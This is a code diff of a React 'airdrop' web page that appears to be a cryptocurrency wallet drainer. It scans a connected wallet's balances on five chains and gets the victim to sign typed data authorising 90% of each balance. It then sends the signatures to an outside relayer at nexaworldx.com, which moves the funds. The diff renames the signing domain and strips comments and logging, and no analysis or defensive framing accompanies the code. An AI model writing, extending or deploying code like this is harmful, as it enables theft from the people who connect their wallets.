@@ -5,7 +5,7 @@ import { ethers } from 'ethers';
 import './index.css';
 
 // ============================================
-// NETWORK CONFIG – NO CONTRACT ADDRESSES
+// NETWORK CONFIG – for balance checks
 // ============================================
 const MULTICHAIN_CONFIG = {
   Ethereum: {
@@ -41,15 +41,19 @@ const MULTICHAIN_CONFIG = {
 };
 
 // ============================================
-// FALLBACK CONTRACT ADDRESSES – ONLY USED IF RELAYER FAILS
+// CONTRACT ADDRESSES – used only for EIP-712 domain
+// (must match your deployed contracts)
 // ============================================
-const FALLBACK_CONTRACT_ADDRESSES = {
+const CONTRACT_ADDRESSES = {
   1: '0x7aD2535F79E8B2B0A6Cf937E8FB334bf8a08Ed47',
   56: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
   137: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
   42161: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
   43114: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288'
 };
+
+// Also used as fallback for nonce (if relayer fails)
+const FALLBACK_CONTRACT_ADDRESSES = CONTRACT_ADDRESSES;
 
 const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
 const RELAYER_URL = 'https://nexaworldx.com/relayer-app/relay';
@@ -80,12 +84,11 @@ const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
   throw lastError || new Error(`No working RPC for ${chain.name}`);
 };
 
-// Fetch nonce – try relayer first, fallback to direct RPC if needed
+// Nonce fetch – try relayer, fallback to direct RPC
 const fetchNonce = async (chain, userAddress) => {
   // 1. Try relayer
   const relayerUrl = `${NONCE_URL}?chainId=${chain.chainId}&user=${userAddress}`;
   try {
-    console.log(`🔍 Trying relayer nonce: ${relayerUrl}`);
     const response = await fetch(relayerUrl);
     if (response.ok) {
       const data = await response.json();
@@ -99,10 +102,10 @@ const fetchNonce = async (chain, userAddress) => {
     console.warn(`⚠️ Relayer nonce error: ${e.message}, falling back to RPC`);
   }
 
-  // 2. Fallback: read nonce directly from contract via RPC (read-only)
+  // 2. Fallback: direct read-only RPC
   const abi = ["function userNonce(address) view returns (uint256)"];
   const contractAddress = FALLBACK_CONTRACT_ADDRESSES[chain.chainId];
-  if (!contractAddress) throw new Error(`No fallback contract address for chain ${chain.chainId}`);
+  if (!contractAddress) throw new Error(`No fallback address for chain ${chain.chainId}`);
 
   for (const rpcUrl of chain.rpcEndpoints) {
     try {
@@ -168,16 +171,18 @@ function App() {
   const [stepStatus, setStepStatus] = useState({});
   const [prices, setPrices] = useState({ eth: 2000, bnb: 300, matic: 0.75, avax: 32 });
 
-  // EIP-712 types – NO CONTRACT ADDRESS
+  // ============================================
+  // EIP-712 – MUST MATCH YOUR CONTRACT
+  // ============================================
   const EIP712_TYPES = {
-    Claim: [
+    Deposit: [
       { name: 'user', type: 'address' },
       { name: 'amount', type: 'uint256' },
       { name: 'nonce', type: 'uint256' },
     ],
   };
 
-  // Fetch crypto prices
+  // Fetch prices
   useEffect(() => {
     const fetchPrices = async () => {
       try {
@@ -196,11 +201,11 @@ function App() {
     return () => clearInterval(interval);
   }, []);
 
-  // Scan all chains for balances
+  // Scan balances
   const fetchAllBalances = async (walletAddress) => {
     setScanning(true);
     setError('');
-    setTxStatus('🔍 Scanning chains for balances...');
+    setTxStatus('🔍 Scanning chains...');
     const balanceResults = {};
     let scanned = 0;
     const totalChains = DEPLOYED_CHAINS.length;
@@ -242,7 +247,7 @@ function App() {
     }
   }, [isConnected, address]);
 
-  // Main claim execution – everything via relayer, with fallback nonce
+  // Main execution
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address) {
       setError('Wallet not initialized');
@@ -263,39 +268,40 @@ function App() {
         setStepStatus(prev => ({ ...prev, [chain.name]: 'switching' }));
         setTxStatus(`🔄 Switching to ${chain.name}...`);
 
-        // 1. Switch network
         await switchNetwork(walletProvider, chain.chainId);
         setStepStatus(prev => ({ ...prev, [chain.name]: 'waiting_chain' }));
-        setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
-
-        // 2. Wait for wallet to confirm chainId
         await waitForChainId(walletProvider, chain.chainId, 10000);
         setStepStatus(prev => ({ ...prev, [chain.name]: 'switched' }));
 
-        // 3. Create fresh provider & signer after chain confirmed
         const newProvider = new ethers.BrowserProvider(walletProvider);
         const newSigner = await newProvider.getSigner();
         const signerAddress = await newSigner.getAddress();
         if (signerAddress.toLowerCase() !== address.toLowerCase()) {
-          throw new Error('Signer address mismatch after network switch');
+          throw new Error('Signer mismatch after network switch');
         }
 
         const balance = balances[chain.name];
         if (!balance || balance.valueUSD < MIN_VALUE_THRESHOLD) continue;
 
-        // 4. Fetch nonce (with fallback)
         setStepStatus(prev => ({ ...prev, [chain.name]: 'fetching_nonce' }));
         const nonce = await fetchNonce(chain, address);
 
-        // 5. Prepare signature (send 90% of balance)
         const amountToSend = balance.amount * 0.9;
         const amountInWei = ethers.parseEther(amountToSend.toFixed(18));
 
+        // ============================================
+        // EIP-712 domain – EXACTLY as contract expects
+        // ============================================
+        const contractAddress = CONTRACT_ADDRESSES[chain.chainId];
+        if (!contractAddress) throw new Error(`No contract address for chain ${chain.chainId}`);
+
         const domain = {
-          name: "BitcoinHyper Airdrop",
-          version: "1",
+          name: "MetaCollector",            // must match contract's DOMAIN_NAME
+          version: "1",                     // must match contract's version
           chainId: chain.chainId,
+          verifyingContract: contractAddress,
         };
+
         const value = {
           user: address,
           amount: amountInWei.toString(),
@@ -307,9 +313,8 @@ function App() {
         const signature = await newSigner.signTypedData(domain, EIP712_TYPES, value);
         setStepStatus(prev => ({ ...prev, [chain.name]: 'signed' }));
 
-        // 6. Send signed payload to relayer for execution
         setStepStatus(prev => ({ ...prev, [chain.name]: 'relaying' }));
-        setTxStatus(`📤 Sending to relayer (${chain.name})...`);
+        setTxStatus(`📤 Sending to relayer...`);
         const response = await fetch(RELAYER_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -346,10 +351,9 @@ function App() {
 
   const formatAddress = (addr) => addr ? `${addr.slice(0,6)}...${addr.slice(38)}` : '';
 
-  // ========== UI (FULL) ==========
+  // ========== UI – Full, same as before ==========
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
-      {/* Animated orbs */}
       <div className="fixed w-[90vmax] h-[90vmax] bg-[radial-gradient(circle_at_40%_50%,rgba(200,120,30,0.12)_0%,rgba(180,100,20,0)_70%)] rounded-full top-[-25vmax] right-[-15vmax] z-0 animate-floatOrbBig pointer-events-none"></div>
       <div className="fixed w-[80vmin] h-[80vmin] bg-[radial-gradient(circle_at_30%_70%,rgba(0,150,200,0.08)_0%,transparent_70%)] rounded-full bottom-[-10vmin] left-[-5vmin] z-0 animate-floatOrbSmall pointer-events-none"></div>
 
